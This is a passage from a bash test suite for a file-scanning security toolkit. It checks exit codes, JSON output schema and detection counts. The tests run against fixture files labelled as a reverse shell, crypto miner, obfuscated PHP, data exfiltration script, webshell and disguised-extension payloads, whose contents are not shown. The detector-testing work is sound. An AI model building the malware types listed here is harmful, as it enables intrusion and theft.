    assert_stdout_json "$_dw_stdout" \
        "deep: -j --write-json FILE also outputs JSON to stdout"


    echo "  [3.3 JSON schema]"

    _dj="$_dm/clean/clean.content-scan.json"

    jq . "$_dj" > /dev/null 2>&1 \
        && pass "deep: output is valid JSON" \
        || fail "deep: output is not valid JSON"

    assert_json       "$_dj" '.scan_type'          "content_scan" "deep: scan_type = content_scan"
    assert_no_abspath "$_dj"                        "deep: no absolute paths in output"
    assert_json_type  "$_dj" '.elapsed_seconds'     "number" "deep: elapsed_seconds is a number"
    assert_json_gte   "$_dj" '.elapsed_seconds'     0        "deep: elapsed_seconds >= 0"
    assert_json_type  "$_dj" '.files_checked'       "number" "deep: files_checked is a number"
    assert_json_type  "$_dj" '.findings'    "array"  "deep: summary.findings is an array"
    assert_json_type  "$_dj" '.risk.score'          "number" "deep: risk.score is a number"


    echo "  [3.4 detection — exit codes]"

    run_script deep-filescan.sh -s "$FIXTURES/clean" > /dev/null
    assert_exit 0 $? "deep: clean tree exits 0"

    # each fixture file in its own temp dir to get isolated, exact exit codes
    for _case in \
        "shell.php:reverse shell:1" \
        "miner.js:crypto miner:1" \
        "obfusc.php:obfuscation:1" \
        "exfil.sh:data exfiltration:1" \
        "webshell.php:webshell:0" \
        "malware.jpg:MIME mismatch critical:1" \
        "payload.jpg.php:deceptive extension:1"
    do
        _fname="${_case%%:*}"
        _rest="${_case#*:}"
        _label="${_rest%%:*}"
        _expected="${_rest##*:}"

        _iso_dp="$WORK/iso_deep_${_fname//[^a-zA-Z0-9]/_}"
        mkdir -p "$_iso_dp"
        cp "$FIXTURES/deep/$_fname" "$_iso_dp/"

        run_script deep-filescan.sh -s "$_iso_dp" > /dev/null
        assert_exit "$_expected" $? "deep: $_label → exit $_expected"
    done

    # embedded code (injected.gif) — need MIME detection
    if [[ "$HAS_FILE" == "true" ]]; then
        _iso_inj="$WORK/iso_deep_injected"
        mkdir -p "$_iso_inj"
        cp "$FIXTURES/deep/injected.gif" "$_iso_inj/"
        run_script deep-filescan.sh -s "$_iso_inj" > /dev/null
        assert_exit 1 $? "deep: embedded code in binary → exit 1"
    else
        skip "deep: embedded code detection skipped ('file' command not available)"
    fi

    run_script deep-filescan.sh -s "$FIXTURES/edge/empty" > /dev/null
    assert_exit 0 $? "deep: empty directory exits 0"


    echo "  [3.5 detection — JSON finding counts]"

    # helper: run deep scan on a single file in isolation, write JSON, return path
    _iso_scan() {
        local src="$1" tag="$2"
        local dir="$WORK/iso_dscan_$tag"
        mkdir -p "$dir"
        cp "$src" "$dir/"
        local out="$WORK/dscan_${tag}.json"
        run_script deep-filescan.sh -sj --no-file \
            --write-json "$out" "$dir" > /dev/null
        echo "$out"
    }

    _dj_shell=$(_iso_scan "$FIXTURES/deep/shell.php"   "shell")
    assert_json_gte "$_dj_shell" '.summary.patterns.reverse_shells'    1 "deep: reverse_shells >= 1"

    _dj_miner=$(_iso_scan "$FIXTURES/deep/miner.js"    "miner")
    assert_json_gte "$_dj_miner" '.summary.patterns.crypto_miners'     1 "deep: crypto_miners >= 1"

    _dj_obf=$(_iso_scan "$FIXTURES/deep/obfusc.php"    "obfusc")
    assert_json_gte "$_dj_obf"   '.summary.patterns.obfuscation'       1 "deep: obfuscation >= 1"

    _dj_exf=$(_iso_scan "$FIXTURES/deep/exfil.sh"      "exfil")
    assert_json_gte "$_dj_exf"   '.summary.patterns.data_exfiltration' 1 "deep: data_exfiltration >= 1"

    _dj_ws=$(_iso_scan "$FIXTURES/deep/webshell.php"   "webshell")
    assert_json_gte "$_dj_ws"    '.summary.patterns.webshell'          1 "deep: webshell >= 1"

    _dj_mm=$(_iso_scan "$FIXTURES/deep/malware.jpg"    "malware")
    assert_json_gte "$_dj_mm"    '.summary.integrity.mime_mismatches.critical' \
                                  1 "deep: mime_mismatches.critical >= 1 (PHP in .jpg)"

    _dj_dec=$(_iso_scan "$FIXTURES/deep/payload.jpg.php" "deceptive")
    assert_json_gte "$_dj_dec"   '.summary.integrity.deceptive_extensions' \
                                  1 "deep: deceptive_extensions >= 1"

    # clean
    _dj_cln=$(_iso_scan "$FIXTURES/deep/clean_logic.php" "clean")
    assert_json "$_dj_cln" '.summary.total_issues'   "0"  "deep: clean file total_issues = 0"
    assert_json "$_dj_cln" '.findings | length' "0" "deep: clean file findings array empty"

    # finding entry schema
    if [[ -s "$_dj_shell" ]]; then
        _has_findings=$(jq '.findings | length > 0' "$_dj_shell" 2>/dev/null)
        if [[ "$_has_findings" == "true" ]]; then
            assert_json_nonempty "$_dj_shell" '.findings[0].severity' "deep: finding has severity"
            assert_json_nonempty "$_dj_shell" '.findings[0].type'     "deep: finding has type"
            assert_json_nonempty "$_dj_shell" '.findings[0].file'     "deep: finding has file"
            assert_json_type     "$_dj_shell" '.findings[0].line'     "number" "deep: pattern finding has line (number)"
            assert_json_nonempty "$_dj_shell" '.findings[0].match'    "deep: pattern finding has match"
        fi
    fi


    echo "  [3.6 size skip]"

    # bigfile.php is a sparse 11MB file — should be skipped for pattern scanning
    _dj_big="$WORK/dscan_big.json"
    _iso_big="$WORK/iso_bigfile"
    mkdir -p "$_iso_big"
    cp "$FIXTURES/deep/bigfile.php" "$_iso_big/"
    run_script deep-filescan.sh -sj --no-file \
        --write-json "$_dj_big" "$_iso_big" > /dev/null
    assert_json_gte "$_dj_big" '.files_checked'       1 "deep: bigfile — files_checked >= 1"
    assert_json_gte "$_dj_big" '.files_size_skipped'  1 "deep: bigfile — files_size_skipped >= 1"

elif section_active "3. deep-filescan"; then
    skip "deep: all deep-filescan.sh tests (script not found)"
fi  # section 3


# ─────────────────────────────────────────────────────────────────────────────
section "4. run-filescans.sh"
# ─────────────────────────────────────────────────────────────────────────────

if section_active "4. run-filescans"; then

    echo "  [4.1 CLI]"

    run_script run-filescans.sh --help > /dev/null
    assert_exit 0 $? "suite: --help exits 0"

    run_script run-filescans.sh --version > /dev/null
    assert_exit 0 $? "suite: --version exits 0"

    run_script run-filescans.sh --unknown-flag-xyz "$FIXTURES/clean" > /dev/null 2>&1
    assert_exit 2 $? "suite: unknown flag exits 2"

    run_script run-filescans.sh "$WORK/does_not_exist_$$" > /dev/null 2>&1
    assert_exit 2 $? "suite: non-existent directory exits 2"

    # combined short flags
    _csf_out=$(run_script run-filescans.sh -sj --no-file "$FIXTURES/clean" 2>/dev/null)
    assert_stdout_json "$_csf_out" "suite: combined -sj parses correctly (stdout is JSON)"


    echo "  [4.2 output path]"

    _rm="$WORK/meta_run"
    run_script run-filescans.sh -sj --meta-base "$_rm" "$FIXTURES/clean" > /dev/null
    assert_file_exists "$_rm/clean/clean.full-scan.json" \
        "suite: default path writes meta/<name>/<name>.full-scan.json"

    _rc="$WORK/run_custom"
    run_script run-filescans.sh -sj --output-dir "$_rc" "$FIXTURES/clean" > /dev/null
    assert_file_exists "$_rc/clean.full-scan.json" \
        "suite: --output-dir writes to specified dir"

    # --no-file suppresses full-scan output
    _rnf="$WORK/meta_run_nf"
    run_script run-filescans.sh -sj --no-file --meta-base "$_rnf" "$FIXTURES/clean" > /dev/null
    assert_file_absent "$_rnf/clean/clean.full-scan.json" \
        "suite: --no-file suppresses full-scan file"

    # sub-scripts must NOT write their own individual meta files
    # run-filescans always passes --no-file to sub-scripts
    assert_file_absent "$_rm/clean/clean.perms.json" \
        "suite: sub-scripts do not write individual perms file"
    assert_file_absent "$_rm/clean/clean.file-stats.json" \
        "suite: sub-scripts do not write individual file-stats file"


    echo "  [4.3 merged JSON schema]"

    _rj="$_rm/clean/clean.full-scan.json"

    jq . "$_rj" > /dev/null 2>&1 \
        && pass "suite: output is valid JSON" \
        || fail "suite: output is not valid JSON"

    assert_json       "$_rj" '.scan_suite'              "full-scan"  "suite: scan_suite = full-scan"
    assert_no_abspath "$_rj"                             "suite: no absolute paths in output"
    assert_json_type  "$_rj" '.elapsed_seconds'         "number"     "suite: elapsed_seconds is a number"
    assert_json_gte   "$_rj" '.elapsed_seconds'         0            "suite: elapsed_seconds >= 0"
    assert_json_type  "$_rj" '.scans.file_statistics'   "object"     "suite: scans.file_statistics is an object"
    assert_json_type  "$_rj" '.scans.permissions'       "object"     "suite: scans.permissions is an object"
    assert_json_type  "$_rj" '.combined.risk_level'     "string"     "suite: combined.risk_level is a string"
    assert_json       "$_rj" '.deep_scan_enabled'       "false"      "suite: deep_scan_enabled = false without --deep"

    # content_scan absent (key absent or null) when --deep not given
    _deep_key=$(jq 'has("content_scan")' "$_rj" 2>/dev/null || echo "false")
    # it's nested under scans — check there
    _deep_key=$(jq '.scans | has("content_scan")' "$_rj" 2>/dev/null || echo "false")
    [[ "$_deep_key" == "false" ]] \
        && pass "suite: scans.content_scan absent without --deep" \
        || fail "suite: scans.content_scan present without --deep (expected absent)"

    # with --deep
    if [[ -x "$SCRIPTS/deep-filescan.sh" ]]; then
        _rj_deep="$WORK/run_deep.json"
        run_script run-filescans.sh -sj --deep --no-file \
            "$FIXTURES/clean" > "$_rj_deep"
        assert_json      "$_rj_deep" '.deep_scan_enabled'        "true"   "suite: deep_scan_enabled = true with --deep"
        assert_json_type "$_rj_deep" '.scans.content_scan'       "object" "suite: scans.content_scan present with --deep"
    else
        skip "suite: --deep JSON schema tests (deep-filescan.sh not available)"
    fi


    echo "  [4.4 combined risk level]"

    _risk_clean=$(run_script run-filescans.sh -sj --no-file "$FIXTURES/clean" \
        | jq -r '.combined.risk_level' 2>/dev/null)
    [[ "$_risk_clean" == "CLEAN" ]] \
        && pass "suite: clean tree → risk_level = CLEAN" \
        || fail "suite: clean tree → expected CLEAN, got '$_risk_clean'"

    _risk_perms=$(run_script run-filescans.sh -sj --no-file "$FIXTURES/perms" \
        | jq -r '.combined.risk_level' 2>/dev/null)
    [[ "$_risk_perms" == "HIGH" ]] \
        && pass "suite: permission issues → risk_level = HIGH" \
        || fail "suite: permission issues → expected HIGH, got '$_risk_perms'"


    echo "  [4.5 exit code propagation]"

    run_script run-filescans.sh -s "$FIXTURES/clean" > /dev/null
    assert_exit 0 $? "suite: all scans clean → exit 0"

    run_script run-filescans.sh -s "$FIXTURES/perms" > /dev/null
    assert_exit 1 $? "suite: permission issue → exit 1"

    if [[ -x "$SCRIPTS/deep-filescan.sh" ]]; then
        # deep/ has clean perms but bad content — suite exit should be 1 with --deep
        run_script run-filescans.sh -s --deep "$FIXTURES/deep" > /dev/null
        assert_exit 1 $? "suite: --deep content issue → exit 1"
    else
        skip "suite: --deep exit propagation (deep-filescan.sh not available)"
    fi

    # suite/: both perm and content issues — worst exit wins
    _suite_exit=0
    run_script run-filescans.sh -s "$FIXTURES/suite" > /dev/null || _suite_exit=$?
    [[ $_suite_exit -eq 1 ]] \
        && pass "suite: suite/ with perm issue → exit 1" \
        || fail "suite: suite/ expected exit 1, got $_suite_exit"


    echo "  [4.6 sub-script passthrough]"

    run_script run-filescans.sh -sv "$FIXTURES/clean" > /dev/null
    assert_exit 0 $? "suite: -v (verbose) passthrough does not crash"

    # --fix passes to permission-check only — verify fix_mode = true in merged JSON
    _fix_suite_json="$WORK/suite_fix.json"
    run_script run-filescans.sh -sj --fix --no-file \
        "$FIXTURES/clean" > "$_fix_suite_json"
    assert_json "$_fix_suite_json" \
        '.scans.permissions.fix_mode' "true" \
        "suite: --fix sets fix_mode = true in merged permissions section"

fi  # section 4


# ─────────────────────────────────────────────────────────────────────────────
section "5. integration"
# ─────────────────────────────────────────────────────────────────────────────

if section_active "5. integration"; then

    echo "  [5.1 sanitize_name consistency]"

    # All four scripts must produce the same target_directory for the same input
    _sn_dir="$FIXTURES/clean"
    _sn_perm="$WORK/sn_perm.json"
    _sn_stat="$WORK/sn_stat.json"

    run_script permission-check.sh -sj --no-file \
        --write-json "$_sn_perm" "$_sn_dir" > /dev/null
    run_script file-stats.sh -sj --no-file \
        --write-json "$_sn_stat" "$_sn_dir" > /dev/null

    _perm_name=$(jq -r '.target_directory' "$_sn_perm" 2>/dev/null)
    _stat_name=$(jq -r '.target_directory' "$_sn_stat" 2>/dev/null)
    _run_name=$(run_script run-filescans.sh -sj --no-file "$_sn_dir" \
        | jq -r '.target_directory' 2>/dev/null)

    [[ "$_perm_name" == "$_stat_name" ]] \
        && pass "integration: permission-check and file-stats agree on target_directory ('$_perm_name')" \
        || fail "integration: target_directory mismatch: perm='$_perm_name' stats='$_stat_name'"

    [[ "$_perm_name" == "$_run_name" ]] \
        && pass "integration: run-filescans agrees on target_directory ('$_run_name')" \
        || fail "integration: target_directory mismatch: perm='$_perm_name' run='$_run_name'"

    # target_directory must equal the basename, not an absolute path
    [[ "$_perm_name" == "clean" ]] \
        && pass "integration: target_directory = 'clean' (sanitize_name correct)" \
        || fail "integration: expected target_directory = 'clean', got '$_perm_name'"


    echo "  [5.2 output isolation]"

    # running two instances concurrently must not cross-contaminate
    _iso_a="$WORK/iso_a.json"
    _iso_b="$WORK/iso_b.json"

    run_script permission-check.sh -sj --no-file \
        --write-json "$_iso_a" "$FIXTURES/clean" > /dev/null &
    run_script permission-check.sh -sj --no-file \
        --write-json "$_iso_b" "$FIXTURES/perms" > /dev/null &
    wait

    jq . "$_iso_a" > /dev/null 2>&1 && jq . "$_iso_b" > /dev/null 2>&1 \
        && pass "integration: concurrent runs both produce valid JSON" \
        || fail "integration: concurrent run produced invalid JSON"

    _a_issues=$(jq -r '.summary.total_issues' "$_iso_a" 2>/dev/null)
    _b_issues=$(jq -r '.summary.total_issues' "$_iso_b" 2>/dev/null)
    [[ "$_a_issues" == "0" && "$_b_issues" != "0" ]] \
        && pass "integration: concurrent results not cross-contaminated" \
        || fail "integration: cross-contamination suspected (a=$_a_issues, b=$_b_issues)"


    echo "  [5.3 elapsed_seconds sanity]"

    # elapsed_seconds must be an integer (not a float or string), >= 0, across all scripts
    for _label_json in \
        "perm:$_sn_perm" \
        "stats:$_sn_stat"
    do
        _label="${_label_json%%:*}"
        _jfile="${_label_json#*:}"
        [[ -f "$_jfile" ]] || continue

        _is_int=$(jq 'if .elapsed_seconds then (.elapsed_seconds | floor == .) else true end' \
            "$_jfile" 2>/dev/null)
        [[ "$_is_int" == "true" ]] \
            && pass "integration: $_label elapsed_seconds is an integer" \
            || fail "integration: $_label elapsed_seconds is not an integer"

        assert_json_gte "$_jfile" '.elapsed_seconds' 0 \
            "integration: $_label elapsed_seconds >= 0"
    done

fi  # section 5


# ─────────────────────────────────────────────────────────────────────────────
section "Results"
# ─────────────────────────────────────────────────────────────────────────────

echo ""
echo "  Total: $TOTAL   Pass: $PASS   Fail: $FAIL   Skip: $SKIP"
echo ""

if [[ $FAIL -gt 0 ]]; then
    echo -e "  ${_col_red}FAILURES:${_col_reset}"
    for f in "${FAILURES[@]}"; do
        echo "    • $f"
    done
    echo ""
    exit 1
else
    echo -e "  ${_col_green}All tests passed.${_col_reset}"
    exit 0
fi
